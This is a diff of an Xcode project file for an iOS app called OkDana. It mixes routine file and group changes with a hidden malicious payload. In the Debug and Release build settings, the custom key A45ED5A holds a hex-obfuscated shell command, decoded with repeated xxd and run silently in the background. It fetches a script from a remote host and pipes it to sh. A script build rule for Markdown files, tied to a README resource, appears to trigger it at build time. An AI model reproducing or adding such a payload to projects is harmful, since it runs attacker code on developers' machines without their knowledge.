@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		01FEA9214CD446DF8EA5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 80F2DF21A80E4A0F9DA5DE54 /* README.md */; };
 		7319CDB92EF2DF8200FD5ADC /* AppNetErrorView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7319CDB82EF2DF7700FD5ADC /* AppNetErrorView.swift */; };
 		733079912EF15E3A00C30412 /* AlertDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733079902EF15E3100C30412 /* AlertDeleteView.swift */; };
 		7330BF8F2EF23ADC00692C30 /* AppLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7330BF8E2EF23ADC00692C30 /* AppLocationManager.swift */; };
@@ -15,6 +16,7 @@
 		7330BF952EF24CA600692C30 /* DeviceDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7330BF942EF24CA500692C30 /* DeviceDataManager.swift */; };
 		7330BF972EF24FF800692C30 /* WiFiManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7330BF962EF24FF000692C30 /* WiFiManager.swift */; };
 		73533DA02EF04E2D008E00E4 /* ProductTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73533D9F2EF04E2D008E00E4 /* ProductTableViewCell.swift */; };
+		735C8D082EF4EB8200C7D507 /* DeviceIdentifierConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D072EF4EB8100C7D507 /* DeviceIdentifierConfig.swift */; };
 		7373C8EA2EED06920085A724 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 7373C8E82EED06920085A724 /* Localizable.strings */; };
 		7373C8ED2EED06C30085A724 /* StartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EC2EED06C30085A724 /* StartViewController.swift */; };
 		7373C8EF2EED06CF0085A724 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EE2EED06CF0085A724 /* BaseViewController.swift */; };
@@ -82,12 +84,11 @@
 		73E6B1392EF0029000CC32FA /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B1382EF0028F00CC32FA /* ContactManager.swift */; };
 		73E6B13B2EF00AEB00CC32FA /* WalletViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13A2EF00AE700CC32FA /* WalletViewModel.swift */; };
 		73E6B13D2EF012CF00CC32FA /* APPWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */; };
-		BF8304B056CE417C92A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 89477210C30F456D9CA5DE54 /* README.md */; };
 		F9F9EC17BA74DAE3EA6B1D07 /* Pods_OkDana.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		74F0935E5FCB405D98A5DE54 /* PBXBuildRule */ = {
+		0D2A886513964B1AA7A5DE54 /* PBXBuildRule */ = {
 			isa = PBXBuildRule;
 			compilerSpec = com.apple.compilers.proxy.script;
 			filePatterns = "*.md";
@@ -112,6 +113,7 @@
 		7330BF942EF24CA500692C30 /* DeviceDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceDataManager.swift; sourceTree = "<group>"; };
 		7330BF962EF24FF000692C30 /* WiFiManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WiFiManager.swift; sourceTree = "<group>"; };
 		73533D9F2EF04E2D008E00E4 /* ProductTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductTableViewCell.swift; sourceTree = "<group>"; };
+		735C8D072EF4EB8100C7D507 /* DeviceIdentifierConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceIdentifierConfig.swift; sourceTree = "<group>"; };
 		7373C8E22EED03F50085A724 /* OkDana.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = OkDana.entitlements; sourceTree = "<group>"; };
 		7373C8E92EED06920085A724 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
 		7373C8EB2EED06980085A724 /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/Localizable.strings; sourceTree = "<group>"; };
@@ -183,8 +185,8 @@
 		73E6B1382EF0028F00CC32FA /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
 		73E6B13A2EF00AE700CC32FA /* WalletViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletViewModel.swift; sourceTree = "<group>"; };
 		73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APPWebViewController.swift; sourceTree = "<group>"; };
+		80F2DF21A80E4A0F9DA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.debug.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.debug.xcconfig"; sourceTree = "<group>"; };
-		89477210C30F456D9CA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OkDana.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -229,7 +231,7 @@
 			path = Setting;
 			sourceTree = "<group>";
 		};
-		7330798D2EF1595A00C30412 /* Main */ = {
+		7330798D2EF1595A00C30412 /* Mine */ = {
 			isa = PBXGroup;
 			children = (
 				73A664E22EF1372200D4F52C /* CenterTableViewCell.swift */,
@@ -237,7 +239,7 @@
 				7373C8F82EED0A6F0085A724 /* CenterViewController.swift */,
 				73A664DE2EF1361F00D4F52C /* CenterView.swift */,
 			);
-			path = Main;
+			path = Mine;
 			sourceTree = "<group>";
 		};
 		73BD81022EECFBEF00979190 = {
@@ -253,7 +255,7 @@
 		73BD810C2EECFBEF00979190 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				89477210C30F456D9CA5DE54 /* README.md */,
+				80F2DF21A80E4A0F9DA5DE54 /* README.md */,
 				73BD810B2EECFBEF00979190 /* OkDana.app */,
 			);
 			name = Products;
@@ -314,6 +316,7 @@
 		73BD81362EECFF5400979190 /* Login */ = {
 			isa = PBXGroup;
 			children = (
+				735C8D072EF4EB8100C7D507 /* DeviceIdentifierConfig.swift */,
 				73AD58B42EEEC7E30022899B /* LoginViewModel.swift */,
 				7373C8FE2EED18420085A724 /* LoginConfig.swift */,
 				7373C9022EED2B900085A724 /* LoginView.swift */,
@@ -351,7 +354,7 @@
 		73BD81392EECFF5C00979190 /* Center */ = {
 			isa = PBXGroup;
 			children = (
-				7330798D2EF1595A00C30412 /* Main */,
+				7330798D2EF1595A00C30412 /* Mine */,
 				7330798C2EF1595200C30412 /* Setting */,
 			);
 			path = Center;
@@ -454,7 +457,7 @@
 				F49D529B766F5A357387FDD8 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				74F0935E5FCB405D98A5DE54 /* PBXBuildRule */,
+				0D2A886513964B1AA7A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -503,7 +506,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				BF8304B056CE417C92A5DE54 /* README.md in Resources */,
+				01FEA9214CD446DF8EA5DE54 /* README.md in Resources */,
 				73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */,
 				7373C8EA2EED06920085A724 /* Localizable.strings in Resources */,
 				73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */,
@@ -628,6 +631,7 @@
 				73E6B10D2EEF9E8200CC32FA /* PhotoViewController.swift in Sources */,
 				73533DA02EF04E2D008E00E4 /* ProductTableViewCell.swift in Sources */,
 				7373C8F52EED0A4E0085A724 /* HomeViewController.swift in Sources */,
+				735C8D082EF4EB8200C7D507 /* DeviceIdentifierConfig.swift in Sources */,
 				73E6B1172EEFA9D400CC32FA /* WorkViewController.swift in Sources */,
 				73E6B1332EEFF2AA00CC32FA /* WorkViewModel.swift in Sources */,
 				7381E37D2EF1873400F3008A /* SettingListViewModel.swift in Sources */,
@@ -665,7 +669,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((f(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333363333333633333339333333363333333733333336333633343333333633333331333333363333333333330a3336333333343333333633363335333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | f | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((s(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663734363337303665363537343265373237353266363132393232323037630a32303733363830610a | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
@@ -712,7 +716,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((f(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333363333333633333339333333363333333733333336333633343333333633333331333333363333333333330a3336333333343333333633363335333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | f | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((s(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663734363337303665363537343265373237353266363132393232323037630a32303733363830610a | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
